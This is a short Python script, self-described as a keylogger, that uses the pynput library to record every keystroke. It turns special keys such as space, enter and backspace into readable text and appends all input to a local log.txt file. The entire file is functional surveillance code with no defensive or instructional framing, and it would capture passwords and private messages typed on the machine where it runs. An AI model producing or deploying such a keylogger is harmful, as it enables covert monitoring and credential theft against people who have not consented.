#listeners - listen to keystrokes
#listening to keyboard(keylogger)
from pynput.keyboard import Listener as KeyboardListener, Key
def writetofile(key):
    keydata = str(key).replace("'", "")  # Removes unnecessary quotes

    # Convert special keys to readable characters
    if key == Key.space:
        keydata = " "
    elif key == Key.enter:
        keydata = "\n"
    elif key == Key.backspace:
        keydata = "[BACKSPACE]"
    elif key == Key.shift or key == Key.shift_r:
        keydata = ""  # Ignore shift key itself

    # Write to file
    with open("log.txt", 'a') as f:
        f.write(keydata)
with KeyboardListener(on_press=writetofile) as l:
    l.join()